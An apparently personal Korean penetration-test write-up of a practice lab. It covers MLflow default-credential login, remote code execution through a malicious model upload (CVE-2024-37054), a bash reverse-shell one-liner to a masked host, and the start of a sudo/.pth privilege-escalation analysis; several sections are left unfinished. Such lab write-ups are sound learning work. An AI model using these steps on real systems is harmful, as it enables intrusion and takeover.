---
publish: true
title: 모의해킹 보고서 - lab18
created: 2026-11-12
modified: 2026-11-12T18:33:53.763Z
published: 2026-11-12
date: 2026-11-12
tags:
description:
lab: lab18
---

## 목차

1. [개요](#1-개요)
2. [총평](#2-총평)
3. [정보 수집 대상](#3-정보-수집-대상)
4. [진단결과 요약](#4-진단결과-요약)
5. [모의해킹 수행 내용](#5-모의해킹-수행-내용)
6. [취약점](#6-취약점)

## 1. 개요

본 보고서는 2026년 11월 12일에 진행된 lab18에 대한 모의해킹 보고서이다.

## 2. 총평

이번 lab18 모의해킹에서는
이는 외부에서 시작된 침해가 서버 전체에 대한 통제권 확보로 확대될 수 있음을 보여준다.

보완을 위해

## 3. 정보 수집 대상

개인 실습 서버 lab18을 대상으로 취약점을 점검했다. 대상 서버 lab18의 IP는 자산 보호 차원에서 가려두었다.

## 4. 진단결과 요약

아래 표는 이번 모의해킹 과정에서 발견된 주요 취약점을 요약한 것이다. 각 취약점에 대한 자세한 설명 및 대응 방안은 본 보고서의 '취약점' 섹션에서 확인할 수 있다.

| 취약점 이름 | 위험도 | 설명  | 대응방안 |
| :----: | :-: | :-: | :--: |
|        |     |     |      |
|        |     |     |      |

## 5. 모의해킹 수행 내용 

![[00. Setting/00. 첨부파일/Pasted image 20261112100359.png]]

대상 서버를 포트 스캔 해보니 `SSH`와 `HTTP`가 열려있다.
`http://smarthire.htb` 도메인도 하나 발견했다.

![[00. Setting/00. 첨부파일/Pasted image 20261112101102.png]]

접속해보면 이런 페이지가 나온다.

![[00. Setting/00. 첨부파일/Pasted image 20261112101729.png]]

![[00. Setting/00. 첨부파일/Pasted image 20261112103020.png]]

**vhost는 항상 체크!**
nmap에 도메인 나오거나 `curl -i http://<IP>` 했을 때 도메인 나오면 무조건 vhost를 스캔해본다.

가상 호스트는 `wfuzz`나 `gobuster` vhost 옵션을 쓸 수 있다.

401 응답으로 `models.smarthire.htb` 가 나왔다.

![[00. Setting/00. 첨부파일/Pasted image 20261112102404.png]]

가상 호스트에 HTTP 요청을 보내본다.

```
www-Authenticate: Basic realm= "mlflow"
you are not authenticated.
```

\=> 이 호스트는 MLflow 서비스이고 인증을 해야 한다.

\*`MLflow`:  머신러닝(컴퓨터가 예시 데이터를 보고 규칙을 학습하게 하는 방법) 모델을 만들고, 기록하고, 관리하고, 배포하는 데 쓰는 도구.

![[00. Setting/00. 첨부파일/Pasted image 20261112103459.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112103622.png]]

host 목록에 가상 호스트를 추가한다.

![[00. Setting/00. 첨부파일/Pasted image 20261112103406.png]]

`models.smarthire.htb` 으로 접속해보면 로그인이 필요하다.
`mlflow`의 기본 인증 정보를 넣어본다.

```
Username: admin
Password: Password
```

![[00. Setting/00. 첨부파일/Pasted image 20261112111737.png]]

로그인이 됐고 이 서비스는 `2.14.1` 버전임을 확인했다.

![[00. Setting/00. 첨부파일/Pasted image 20261112102932.png]]
노출된 취약점 `CVE-2024-37054`가 있는 버전이다.

악성 모델을 조작해 업로드를 해야 하는 취약점이기 때문에 조작할 기존 모델이 필요하다.

![[00. Setting/00. 첨부파일/Pasted image 20261112110940.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112110844.png]]

모델을 등록하기 위해 계정을 만든다.

![[00. Setting/00. 첨부파일/Pasted image 20261112110755.png]]

개발자 도구로 확인해보니 `hee02-4fadc17b4542-model`가 생겼다.

![[00. Setting/00. 첨부파일/Pasted image 20261112113050.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112113018.png]]

\*`CSV`: 표 데이터를 텍스트로 저장하는 파일 형식. 예제는 학습 시키려는 분류표를 텍스트로 만들어 놓은 것.

모델이 잘 작동하는지 확인 하기 위해 안내대로 진행해본다.

![[00. Setting/00. 첨부파일/Pasted image 20261112113002.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112112931.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112113125.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112163440.png]]

예제문대로 `.csv` 파일을 만들어서 올리면 정상적으로 업로드가 된다.  학습된 모델의 정보도 확인이 가능하다. (학습을 두 번 했기 때문에 version이 2가 되었다.)

![[00. Setting/00. 첨부파일/Pasted image 20261112113601.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112113915.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112113938.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112164024.png]]

두 번째 과정인 `Make Predictions`도 예제로 `.csv` 파일을 만들어서 올려보면 정상적으로 진행된다. 예측을 할 땐 version이 바뀌지 않는 걸 보아 기존의 모델 중 최신 모델을 불러오는 것을 알 수 있다. (burp suite의 화면은 웹페이지 증적자료 이후 한 번 더 학습을 해 버전이 올라갔음을 알린다)

![[00. Setting/00. 첨부파일/Pasted image 20261112132425.png]]

취약점 공격을 위해 `Github`에서 저장소를 복사해온다.

![[00. Setting/00. 첨부파일/Pasted image 20261112132445.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112132459.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112132623.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112132723.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112132740.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112132751.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112175342.png]]

`READ ME.md` 를 읽어보면,

```
MLFLOW_TRACKING_URI = "MLflow 서버주소"
REGISTERED_MODEL_NAME = "등록할 모델 이름"
```

이 두 가지를 수정해서 코드를 실행하면 악성 페이로드가 들어간 모델이 만들어지고, 만든 악성 모델을 불러오는 과정을 설명하고 있다.

```
cmd = 'echo ">>> RCE PAYLOAD EXECUTED SUCCESSFULLY <<<" && echo > pwned.txt'
```

모델을 불러오는 과정에서 cmd의 문자열(RCE PAYLOAD EXECUTED SUCCESSFULLY를 출력하고 이 출력 내용을 담은 pwned.txt 파일을 생성한다)을 실행한다고 한다. 이 cmd에 리버스쉘을 넣어볼 수 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261112161324.png]]

`MLFLOW_TRACKING_URI`는 서비스의 도메인 주소로, `REGISTERED_MODEL_NAME`은 만들어둔 모델 이름을 넣어 `log_malicious_model.py` 코드를 수정한다.

![[00. Setting/00. 첨부파일/Pasted image 20261112172019.png]]

![[00. Setting/00. 첨부파일/Pasted image 20261112165305.png]]

![[00. Setting/00. 첨부파일/Pasted image 20261112161744.png]]

바로 `python poc/log_malicious_model.py`을 실행하려 하니 오류가 났다.

칼리에서 모델을 수정하기 위해 `MLflow 2.14.1`을 설치해야 한다. 대상 서버의 `MLflow 2.14.1`는 `python 3.10.12` 버전이다. 기존 칼리의 python 환경을 바꾸지 않고 `python 3.10` 버전을 설치하기 위해 `uv`를 써서 진행해준다.

\*`uv`: Python 버전과 패키지, 가상환경을 관리하는 도구

![[00. Setting/00. 첨부파일/Pasted image 20261112161911.png]]

```
uv venv --python 3.10 .venv310
```

설치한 `python`으로 `.venv310` 폴더에 가상 환경을 만들어준다.

![[00. Setting/00. 첨부파일/Pasted image 20261112161804.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112170138.png]]

```
source.venv310/bin/activate
```

가상 환경을 현재 터미널에서 활성화 한다. 프롬프트에 `(.venv310)`이 붙었다.

![[00. Setting/00. 첨부파일/Pasted image 20261112161949.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112162022.png]]

\*`setuptools`: 파이썬 패키지를 설치하고 관리하는 데 쓰이는 도구

로컬 칼리는 `python 3.14` 환경의 `setuptools`를 쓰고 있기 때문에 3.10에서 제공하는 환경의 `setuptools`를 쓰는 `mlflow 2.14.1`과 맞지 않아 오류가 난다.
낮은 버전 (<81 => 81보다 낮음)을 설치해 호환성 문제를 해결해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261112162202.png]]

![[00. Setting/00. 첨부파일/Pasted image 20261112162246.png]]

`python poc/log_malicious_model.py`를 실행해보니 version 6으로 새 모델이 만들어졌고 웹에서도 확인이 가능하다.

![[00. Setting/00. 첨부파일/Pasted image 20261112140437.png]]

`Make predicitons`가 기존 모델 중 최신 모델을 불러오는 역할을 해준다고 했으니 `Anlyze Resume`를 클릭해 모델을 불러온다.

![[00. Setting/00. 첨부파일/Pasted image 20261112172734.png]]

불러오는 중에 코드도 실행이 되어서 `pwned.txt` 파일이 생겼다.

![[00. Setting/00. 첨부파일/Pasted image 20261112162330.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112175040.png]]

![[00. Setting/00. 첨부파일/Pasted image 20261112175434.png]]

이제 리버스쉘을 넣어보자.

```
 bash -c 'bash -i >& /dev/tcp/[mask]/4444 0>&1'
```

- `bash -c`: 따옴표 안의 명령을 Bash로 실행
- `bash -i`: 대화형 셸을 시작
- `/dev/tcp/[MASK]/4444`: Kali의 VPN IP와 4444 포트로 TCP 연결
- `>&`와 `0>&1`: 셸의 입출력을 그 연결에 연결

코드 수정 후 한 번 더 새 모델을 올려준다.

![[00. Setting/00. 첨부파일/Pasted image 20261112140437.png]]

![[00. Setting/00. 첨부파일/Pasted image 20261112140425.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112181352.png]]

포트를 열어주고 `Anlyze Resume`를 클릭하면 연결이 된다. `svcweb` 쉘을 얻었다. `svcweb`은 자기 자신의 그룹 외에도`mlflowweb`과 `devs` 그룹에 속해 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261112141732.png]]

`sudo -l`로 사용자 `svcweb`이 루트 권한으로 실행 가능한 명령이 있나 확인해보니,

1. `/usr/bin/python3.10`
2. `/opt/tools/mlflow_ctl/mlflowctl.py`

두 개가 확인 된다. `mlflowctl.py`를 `python3.10`으로, root 권한으로 실행할 수 있겠다.

![[00. Setting/00. 첨부파일/Pasted image 20261112182407.png]]

`/opt/tools/mlflow_ctl/mlflowctl.py`을 읽어보자.

![[00. Setting/00. 첨부파일/Pasted image 20261113023833.png]]

```
from pathlib import Path
import sys
import site
```

1. `path` 도구, `sys`, `site` 모듈을 불러온다. (`import`)

```
BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"
# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

2. `mlflowctl.py`(현재 파이썬 스크립트)가 들어있는 `Path(__file__).resolve().parent` (폴더의 절대 경로 => `/opt/tools/mlflow_ctl/` )를 `BASE_DIR`에 저장하고, `BASE_DIR`(`/opt/tools/mlflow_ctl/`) 안에 있는 `plugins` 폴더의 경로를 만들어 `PLUGINS_DIR`에 저장한다. => `PLUGINS_DIR`은 `/opt/tools/mlflow_ctl/plugins` 가 된다.<br><br>
   그리고 `plugins` 안의 하위 폴더를 하나씩 살펴보고, 폴더인지 확인하고, 그 하위 폴더를
   python 모듈 검색 경로에 추가한다. `site.addsitedir(str(path))` 함수는 **폴더 안의 `.pth` 파일도 처리가 가능하다.** <br><br>   => 플러그인 하위 폴더 마다 호출이 되기 때문에 `plugins` 하위 폴더들은 다 `.pth` 처리가 가능하다.

\*`PTH`: Python 사이트 폴더의 경로 설정 파일.

![[00. Setting/00. 첨부파일/Pasted image 20261112181916.png]]

`/opt/tools/mlflow_ctl/plugins` 에 가보면 `core`와 `dev`가 있다. 그중 `dev`는 `devs`그룹에 쓰기 권한이 있다. 앞서 확인 했을 때 `svcweb`이 `devs`의 그룹에 속해 있었으니 현재 사용자에게 쓰기 권한이 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261113032810.png]]

![[00. Setting/00. 첨부파일/Pasted image 20261113033046.png]]

## 6. 취약점

```
cvs
```

### 6.1  

  **6.1.1 설명**

-

  **6.1.2 조치방법**

-
